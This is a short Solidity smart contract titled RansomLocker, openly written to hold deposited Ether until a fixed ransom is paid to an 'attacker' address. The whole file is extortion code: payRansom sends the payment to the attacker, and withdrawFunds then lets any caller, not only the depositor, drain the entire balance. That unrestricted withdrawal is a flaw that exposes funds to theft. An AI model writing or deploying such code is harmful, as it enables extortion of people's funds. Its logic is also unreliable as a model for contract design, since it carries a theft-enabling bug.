// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

/// @title RansomLocker - Locks funds until ransom is paid to attacker
contract RansomLocker {
    address public attacker;
    uint256 public ransomAmount;
    bool public unlocked;

    constructor(address _attacker, uint256 _ransomAmount) payable {
        attacker = _attacker;
        ransomAmount = _ransomAmount;
    }

    function payRansom() external payable {
        require(msg.sender != address(0), "Invalid sender");
        require(msg.value == ransomAmount, "Incorrect amount");
        payable(attacker).transfer(msg.value);
        unlocked = true;
    }

    function withdrawFunds() external {
        require(unlocked, "Locked");
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
